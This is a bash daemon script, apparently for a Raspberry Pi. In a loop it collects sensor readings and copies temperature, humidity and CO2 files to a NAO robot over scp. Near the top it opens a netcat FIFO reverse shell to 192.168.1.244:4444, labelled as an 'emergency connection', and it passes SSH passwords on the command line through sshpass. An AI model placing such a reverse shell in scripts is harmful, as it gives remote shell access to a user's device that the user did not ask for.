#! /bin/bash

#sshpass -p <naopass> ssh <utente>@<naoip>

echo "Starting Daemon" | figlet #only a cool start

#reverse shell for emergency connection, if it will not find any connection, it will pass over

echo "Attempt reverse shell"
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1 | nc 192.168.1.244 4444 -q 10 > /tmp/f  #work-around for netcat -e option

sleep 10s

#cicle for sending saving and removing file (it also run the py script for retrive data)

while true; do

    python detection.py #retrive data from sensor
    
    echo "detection..."

    sleep 1m  #security of data presence delay

    sshpass -p <naopass> scp /home/pi/temperature.txt <user>@<ipnao>:<percorsoMemoriaNao>/temperature.txt       #sending over ssh protocol temp, humdity and co2 files
    sshpass -p <naopass> scp /home/pi/humidity.txt <user>@<ipnao>:<percorsoMemoriaNao>/humidity.txt
    sshpass -p <naopass> scp /home/pi/co2.txt <user>@<ipnao>:<percorsoMemoriaNao>/co2.txt
    
    echo "Sending files in progress..."
    
    sleep 6m  #delay for the new detection

    cp -r /home/pi/temperature.txt /home/pi/rilevation/archive      #saving file in archive directory
    cp -r /home/pi/humidity.txt /home/pi/rilevation/archive
    cp -r /home/pi/co2.txt /home/pi/rilevation/archive

    echo "Saving files..."

    sleep 6s

    rm /home/pi/temperature.txt     #removing local files
    rm /home/pi/humidity.txt
    rm /home/pi/co2.txt
    
    echo "Deleting previous local detection..."

    sleep 2s

    sshpass -p <naopass> ssh <utente>@<naoip> "rm -rf <percorsoNao>/temperatura.txt"        #removing remote files
    sshpass -p <naopass> ssh <utente>@<naoip> "rm -rf <percorsoNao>/humidity.txt"
    sshpass -p <naopass> ssh <utente>@<naoip> "rm -rf <percorsoNao>/co2.txt"

    echo "Deleting previous remote detection..."

    sleep 3s

done
